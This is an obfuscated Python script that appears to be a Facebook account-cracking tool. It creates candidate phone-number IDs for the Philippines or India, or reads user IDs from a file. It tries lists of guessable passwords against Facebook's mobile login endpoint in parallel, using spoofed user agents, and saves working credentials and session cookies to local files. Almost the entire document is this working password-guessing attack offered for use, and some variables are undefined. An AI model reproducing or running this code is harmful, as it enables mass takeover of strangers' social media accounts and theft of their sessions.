import os ,random #line:2
import sys ,time ,uuid #line:3
try :#line:4
    import requests ,bs4 ,mechanize ,httpx #line:5
    import rich ,json ,subprocess ,random ,string #line:6
    from concurrent .futures import ThreadPoolExecutor as ThreadPool #line:7
except ModuleNotFoundError :#line:8
    print ('\x1b[38;5;46m[\x1b[1;97m≈\x1b[38;5;46m] MODULE INSTALLING ')#line:9
    os .system ('pip install requests rich')#line:10
    os .system ('pip install mechanize')#line:11
    os .system ('pip install bs4 httpx')#line:12
try :#line:14
    prox =requests .get ('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=https&timeout=1000&country=all&ssl=all&anonymity=all').text #line:15
    open ('.prox.txt','w').write (prox )#line:16
except Exception as e :#line:17
    pass #line:18
prox =open ('.prox.txt','r').read ().splitlines ()#line:19
loop ,ok ,cp ,user =0 ,[],[],[]#line:21
cok ,plist =[],[]#line:22
A ='\x1b[1;97m'#line:24
R ='\x1b[38;5;196m'#line:25
Y ='\033[1;33m'#line:26
G ='\x1b[38;5;48m'#line:27
B ='\x1b[38;5;8m'#line:28
G1 ='\x1b[38;5;46m'#line:29
G2 ='\x1b[38;5;47m'#line:30
G3 ='\x1b[38;5;48m'#line:31
G4 ='\x1b[38;5;49m'#line:32
G5 ='\x1b[38;5;50m'#line:33
X ='\33[1;34m'#line:34
X1 ='\x1b[38;5;14m'#line:35
X2 ='\x1b[38;5;123m'#line:36
X3 ='\x1b[38;5;122m'#line:37
X4 ='\x1b[38;5;86m'#line:38
X5 ='\x1b[38;5;121m'#line:39
S ='\x1b[1;96m'#line:40
M ='\x1b[38;5;205m'#line:41
def linex ():#line:43
    print (f'{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:44
def clear ():#line:45
        os .system (f'clear')#line:46
        print (logo )#line:47
def CEN ():#line:49
	OO00OOO000OOO000O =f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"#line:50
	O00O0O000000O000O =str (random .randint (10000000 ,66666666 ))#line:51
	O0O000O00O0000OOO =str (random .randint (000000000 ,999999999 ))#line:52
	O0O0O0O0OOO000OO0 =random .choice (['2.0','2.5','3.0'])#line:53
	OO0OO00O000OOOO00 =random .choice (["720","1080","1280"])#line:54
	O00000000OO0O00OO =random .choice (["720","1080","1280","1440","1920"])#line:55
	OOO0OOO0OO0O0OO0O =f"[FBAN/FB4A;FBAV/{str(OO00OOO000OOO000O)};FBBV/{str(O00O0O000000O000O)};[FBAN/FB4A;FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={O0O0O0O0OOO000OO0},width={OO0OO00O000OOOO00},height={O00000000OO0O00OO}}};FBLC/en_US;FBRV/{str(O0O000O00O0000OOO)};FBCR/MTN-CG;FBMF/Asus;FBBD/Asus;FBPN/com.facebook.katana;FBDV/ASUS_X01BDA;FBSV/9.0;FBOP/1;FBCA/arm64-v8a:]"#line:56
	return OOO0OOO0OO0O0OO0O #line:57
logo =(f"""
       {G1}███████ {Y}████████ {M}███    ██ {S}█████████
       {G2}██      {Y}██       {M}██ █   ██ {S}   ██    
       {G3}██      {Y}████████ {M}██  █  ██ {S}   ██    
       {G4}██      {Y}██       {M}██   █ ██ {S}   ██    
       {G5}███████ {Y}████████ {M}██    ███ {S}   ██    
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G1}[{A}≈{G1}]{G1} DEVELOPER {A}➢{G1} CENT
{G1}[{A}≈{G1}]{G1} TOOLTYPE  {A}➢{G1} FILE {A}&{G1} RANDOM CLONE
{G1}[{A}≈{G1}]{G1} VERSION   {A}➢{A} V{G1}/{A}0.1
{G1}[{A}≈{G1}]{G1} STATUS    {A}➢{A} PRIVATE
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")#line:70
def menu ():#line:72
    clear ()#line:73
    print (f'{G1}[{A}1{G1}]{G1} FILE CLONE ')#line:74
    print (f'{G1}[{A}2{G1}]{G1} RANDOM CLONE ')#line:75
    print (f'{G1}[{A}3{G1}]{G1} CONTACT OWNER ')#line:76
    print (f'{G1}[{A}0{G1}]{G1} EXIT TOOL ')#line:77
    linex ()#line:78
    O000O0O0000O00O00 =input (f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')#line:79
    if O000O0O0000O00O00 in ['1']:#line:80
        file ()#line:81
    elif O000O0O0000O00O00 in ['2']:#line:82
        tsu ()#line:83
    elif O000O0O0000O00O00 in ['3']:#line:84
        os .system ('xdg-open https://www.facebook.com/CenT.aep');menu ()#line:85
    elif O000O0O0000O00O00 in ['0']:#line:86
        sys .exit ()#line:87
    else :#line:88
        menu ()#line:89
def tsu ():#line:91
    clear ()#line:92
    print (f'{G1}[{A}1{G1}]{G1} Philipines CLONE')#line:93
    print (f'{G1}[{A}2{G1}]{G1} INDIA CLONE')#line:94
    print (f'{G1}[{A}0{G1}]{G1} BACK MENU');linex ()#line:95
    OOOO0OO000OO0OO0O =input (f'{G1}[{A}?{G1}]{G1} CHOICE {A}➢{G1} ')#line:96
    if OOOO0OO000OO0OO0O in ['1']:#line:97
        bd ()#line:98
    elif OOOO0OO000OO0OO0O in ['2']:#line:99
        India ()#line:100
    elif OOOO0OO000OO0OO0O in ['0']:#line:101
    	menu ()#line:102
    else :#line:103
        tsu ()#line:104
def bd ():#line:106
    clear ()#line:107
    print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 099{G}/{A}094{G}/{A}091{G}/{A}095');linex ()#line:108
    OO00000OOO0OOOO0O =input (f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')#line:109
    clear ()#line:110
    print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999');linex ()#line:111
    OOO000OO0OO00O000 =int (input (f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))#line:112
    for O0OOO00OOO00OOOOO in range (OOO000OO0OO00O000 ):#line:113
        O00000OO0OO0O0O0O ="".join (random .choice (string .digits )for _O0OOOO0OOO0O00O00 in range (8 ))#line:114
        user .append (O00000OO0OO0O0O0O )#line:115
    clear ()#line:116
    with ThreadPool (max_workers =30 )as OO0000000O0OO00OO :#line:117
        clear ()#line:118
        print (f'{G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {OO00000OOO0OOOO0O}')#line:119
        print (f'{G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {str(len(user))}')#line:120
        print (f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex ()#line:121
        for O0OO0OO000OOOO00O in user :#line:122
            O0OO0OOOO0O0000OO =OO00000OOO0OOOO0O +O0OO0OO000OOOO00O #line:123
            O00O0OOOO0O0O00OO =O0OO0OOOO0O0000OO [:8 ]#line:124
            OOO0OOOO0OOO0OOOO =O0OO0OOOO0O0000OO [:7 ]#line:125
            OOOOO0OOO0O0O000O =O0OO0OOOO0O0000OO [:6 ]#line:126
            OO0O0OOOOOO0OOO00 =O0OO0OO000OOOO00O [1 :]#line:127
            O000O0OO0OO000OO0 =O0OO0OO000OOOO00O [2 :]#line:128
            O0O00OOO000OOO000 =[O0OO0OOOO0O0000OO ,O0OO0OO000OOOO00O ,O00O0OOOO0O0O00OO ,OOO0OOOO0OOO0OOOO ,OOOOO0OOO0O0O000O ,OO0O0OOOOOO0OOO00 ,O000O0OO0OO000OO0 ,'77889900','bangladesh','bangla','jannat','jannatul','mariya','sadiya','farjana','sabbir','rakibul','mahidul','nusrat','tamanna','mimmim','suraiya','alamin','arafat','bushra','roksana','tabassum','tanisha','tasnim']#line:129
            OO0000000O0OO00OO .submit (randm ,O0OO0OOOO0O0000OO ,O0O00OOO000OOO000 )#line:130
    print ('')#line:131
    print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:132
    print (f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')#line:133
    print (f'{G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')#line:134
    print (f'{G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')#line:135
    print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:136
    input (f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')#line:137
    menu ()#line:138
def India ():#line:140
    clear ()#line:141
    print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} +91639{G}/{A}+91934{G}/{A}+91902{G}/{A}+91701');linex ()#line:142
    OO00OOO000O0O0O0O =input (f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} ')#line:143
    clear ()#line:144
    print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} 3000{G}/{A}5000{G}/{A}10000{G}/{A}99999');linex ()#line:145
    O0O0OO0000O00OO0O =int (input (f'{G1}[{A}?{G1}]{G1} CHOICE  {A}➢{G1} '))#line:146
    for O0O0O0O000OOOOO0O in range (O0O0OO0000O00OO0O ):#line:147
        OOOOO0O00O0O0OOO0 ="".join (random .choice (string .digits )for _O0O0O00O0O0000O00 in range (7 ))#line:148
        user .append (OOOOO0O00O0O0OOO0 )#line:149
    clear ()#line:150
    with ThreadPool (max_workers =30 )as O00OO000OO00O000O :#line:151
        clear ()#line:152
        print (f'{G1}[{A}≈{G1}]{G1} SIM CODE  {A}➢{A} {OO00OOO000O0O0O0O}')#line:153
        print (f'{G1}[{A}≈{G1}]{G1} TOTAL UID {A}➢{A} {str(len(user))}')#line:154
        print (f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex ()#line:155
        for OOOOO0OOO0O0OO0O0 in user :#line:156
            OOOO0O000O0000000 =OO00OOO000O0O0O0O +OOOOO0OOO0O0OO0O0 #line:157
            OOOO0OOOO000OOOOO =[OOOOO0OOO0O0OO0O0 ,OOOO0O000O0000000 [:8 ],'57273200','59039200','57575751']#line:158
            O00OO000OO00O000O .submit (randm ,OOOO0O000O0000000 ,OOOO0OOOO000OOOOO )#line:159
    print ('')#line:160
    print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:161
    print (f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')#line:162
    print (f'{G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')#line:163
    print (f'{G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')#line:164
    print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:165
    input (f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')#line:166
    menu ()#line:167
def file ():#line:169
    clear ()#line:170
    print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} /{A}sdcard{G1}/{A}CENT.txt');linex ()#line:171
    O0OOOOOOO000OOOO0 =input (f'{G1}[{A}?{G1}]{G1} FILE NAME {A}➢{G1} ')#line:172
    try :#line:173
        O00O0O000O0OOO000 =open (O0OOOOOOO000OOOO0 ,'r').read ().splitlines ()#line:174
    except FileNotFoundError :#line:175
        print (f'{G1}[{A}≈{G1}]{G1} FILE NOT FOUND');time .sleep (1 )#line:176
        O0OOOOOOO000OOOO0 ()#line:177
    clear ()#line:178
    print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} {G1}[{A}1-20{G1}]{G1}');linex ()#line:179
    O00OOO00OOOOOO00O =int (input (f'{G1}[{A}?{G1}]{G1} PASSWORD LIMIT {A}➢{G1} '))#line:180
    clear ()#line:181
    for O0O0O00O0OOO00O00 in range (O00OOO00OOOOOO00O ):#line:182
        print (f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{A} firstlast{G1}/{A}first123{G1}/{A}last123')#line:183
        plist .append (input (f'{G1}[{A}?{G1}]{G1} PASSWORD NO {G1}[{A}{O0O0O00O0OOO00O00+1}{G1}]{G1} {A}➢{S} '));linex ()#line:184
    with ThreadPool (max_workers =30 )as OO000000000000O0O :#line:185
        OO0O000OO0OO00O00 =str (len (O00O0O000O0OOO000 ))#line:186
        clear ()#line:187
        print (f'{G1}[{A}≈{G1}]{G1} TOTAL ID {A}➢{G1} {OO0O000OO0OO00O00}')#line:188
        print (f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex ()#line:189
        for O00O000OOOOOO0000 in O00O0O000O0OOO000 :#line:190
            O0OO0O0O0O0OO00O0 ,O00OO0O00OO000O00 =O00O000OOOOOO0000 .split ('|')#line:191
            OO0OO00000O0OOO00 =plist #line:192
            OO000000000000O0O .submit (M1 ,O0OO0O0O0O0OO00O0 ,O00OO0O00OO000O00 ,OO0OO00000O0OOO00 )#line:193
    print ('')#line:194
    print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:195
    print (f'{G1}[{A}≈{G1}]{G1} THE PROCESS HAS BEEN COMPLETED')#line:196
    print (f'{G1}[{A}≈{G1}]{G1} TOTAL OK ID {A}➢{G1} {str(len(ok))}')#line:197
    print (f'{G1}[{A}≈{G1}]{M} TOTAL CP ID {A}➢{M} {str(len(cp))}')#line:198
    print (f'\r{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')#line:199
    input (f'{G1}[{A}≈{G1}]{G1} PRESS ENTER TO BACK ')#line:200
    menu ()#line:201
def randm (OOOOOO0OOOO00O00O ,O0OO00O0O00O0O000 ):#line:203
    global loop ,ok #line:204
    O00OOOO0OO0OOOOO0 =random .choice (prox )#line:205
    OO00OOOO0OO0OO000 ={'http':'socks4://'+O00OOOO0OO0OOOOO0 }#line:206
    sys .stdout .write (f'\r\r{A}[{G1}SWAG-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')#line:207
    sys .stdout .flush ()#line:208
    try :#line:209
        for O00O0O0O0O0O000O0 in O0OO00O0O00O0O000 :#line:210
            OO00OOOO000O0OO00 ={'adid':str (uuid .uuid4 ()),'format':'json','device_id':str (uuid .uuid4 ()),'email':OOOOOO0OOOO00O00O ,'password':O00O0O0O0O0O000O0 ,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str (uuid .uuid4 ()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}#line:231
            OOO0OO0OOOO000O0O ={'User-Agent':CEN (),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str (random .randint (2e4 ,4e4 )),'X-FB-SIM-HNI':str (random .randint (2e4 ,4e4 )),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'MOBILE.LTE','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}#line:249
            OOOOOO0O0OOOOOO00 ='https://b-graph.facebook.com/auth/login'#line:250
            O0O00O0OOO0OOOOOO =requests .post (OOOOOO0O0OOOOOO00 ,data =OO00OOOO000O0OO00 ,headers =OOO0OO0OOOO000O0O ,allow_redirects =False ).text #line:251
            O00O0OO0OOOO0000O =json .loads (O0O00O0OOO0OOOOOO )#line:252
            if 'access_token'in O00O0OO0OOOO0000O :#line:253
                O0OOOO0O0O000O0O0 =str (O00O0OO0OOOO0000O ['uid'])#line:254
                OOO00O0O000O00O0O =";".join (OOO00OO000000OO0O ["name"]+"="+OOO00OO000000OO0O ["value"]for OOO00OO000000OO0O in O00O0OO0OOOO0000O ["session_cookies"])#line:255
                if res =='LIVE':#line:256
                	print (f'\r\r{A}[{G1}CENT-OK{A}]{G1} {O0OOOO0O0O000O0O0} {A}|{G1} {O00O0O0O0O0O000O0}');open ('/sdcard/CENT-FILE-OK.txt','a').write (O0OOOO0O0O000O0O0 +'|'+O00O0O0O0O0O000O0 +'|'+OOO00O0O000O00O0O +'\n');ok .append (O0OOOO0O0O000O0O0 );break #line:257
                if res =='LOCK':#line:258
                	print (f'\r\r{A}[{S}CENT-PODLOCK{A}]{S} {O0OOOO0O0O000O0O0} {A}|{S} {O00O0O0O0O0O000O0}');break #line:259
            else :continue #line:260
        loop +=1 #line:261
    except Exception as O00O0OOO000O0OO00 :#line:262
        pass #line:263
def M1 (OO00000O00O00OO0O ,O0OOOO0O0O000OOOO ,OOOOO00OOOO0OO0O0 ):#line:265
    global loop ,ok #line:266
    OO000O0O0O0000O00 =random .choice (prox )#line:267
    O0OOO0OOO000O0O0O ={'http':'socks4://'+OO000O0O0O0000O00 }#line:268
    sys .stdout .write (f'\r\r{A}[{G1}CENT-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')#line:269
    sys .stdout .flush ()#line:270
    try :#line:271
        OOO0OO0O00OO0O00O =O0OOOO0O0O000OOOO .split (' ')[0 ]#line:272
        try :O00O0O00OO0O0O0OO =O0OOOO0O0O000OOOO .split (' ')[1 ]#line:273
        except :O00O0O00OO0O0O0OO =OOO0OO0O00OO0O00O #line:274
        for O00OO0O0OOO0OOO0O in OOOOO00OOOO0OO0O0 :#line:275
            OOO0OOOOO0O0O0OOO =O00OO0O0OOO0OOO0O .replace ('first',OOO0OO0O00OO0O00O .lower ()).replace ('First',OOO0OO0O00OO0O00O ).replace ('last',O00O0O00OO0O0O0OO .lower ()).replace ('Last',O00O0O00OO0O0O0OO ).replace ('Name',O0OOOO0O0O000OOOO ).replace ('name',O0OOOO0O0O000OOOO .lower ())#line:276
            O0000OO0OO0000000 ={'adid':str (uuid .uuid4 ()),'format':'json','device_id':str (uuid .uuid4 ()),'email':OO00000O00O00OO0O ,'password':OOO0OOOOO0O0O0OOO ,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str (uuid .uuid4 ()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_US','client_country_code':'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':'350685531728|62f8ce9f74b12f84c123cc23437a4a32'}#line:297
            O00OOO0O000OO0OO0 ={'User-Agent':CEN (),'Accept-Encoding':'gzip, deflate','Connection':'close','Content-Type':'application/x-www-form-urlencoded','Host':'graph.facebook.com','X-FB-Net-HNI':str (random .randint (2e4 ,4e4 )),'X-FB-SIM-HNI':str (random .randint (2e4 ,4e4 )),'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','X-FB-Connection-Type':'MOBILE.LTE','X-Tigon-Is-Retry':'False','x-fb-session-id':'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32','x-fb-device-group':'5120','X-FB-Friendly-Name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags':'graphservice','X-FB-HTTP-Engine':'Liger','X-FB-Client-IP':'True','X-FB-Server-Cluster':'True','x-fb-connection-token':'62f8ce9f74b12f84c123cc23437a4a32'}#line:315
            O00000O0OO00O00O0 =requests .post ('https://b-graph.facebook.com/auth/login',data =O0000OO0OO0000000 ,headers =O00OOO0O000OO0OO0 ).json ()#line:316
            if 'access_token'in O00000O0OO00O00O0 :#line:317
                print (f'\r\r{A}[{G1}CEN-OK{A}]{G1} {OO00000O00O00OO0O} {A}|{G1} {OOO0OOOOO0O0O0OOO}')#line:318
                O0000O00O000O0OO0 =";".join (OOO0O000OOOOOOOO0 ["name"]+"="+OOO0O000OOOOOOOO0 ["value"]for OOO0O000OOOOOOOO0 in O00000O0OO00O00O0 ["session_cookies"])#line:319
                open ('/sdcard/CEN-FILE-OK.txt','a').write (uid +'|'+OOO0OOOOO0O0O0OOO +'|'+O0000O00O000O0OO0 +'\n')#line:320
                ok .append (OO00000O00O00OO0O )#line:321
                break #line:322
            elif 'www.facebook.com'in O00000O0OO00O00O0 ['error']['message']:#line:323
                open ('/sdcard/CEN-FILE-PODLOCK.txt','a').write (OO00000O00O00OO0O +'|'+OOO0OOOOO0O0O0OOO +'\n')#line:325
            else :continue #line:326
        loop +=1 #line:327
    except Exception as OOO000O0000OOO00O :#line:328
        pass #line:329
if __name__ =='__main__':#line:330
    menu ()#line:331
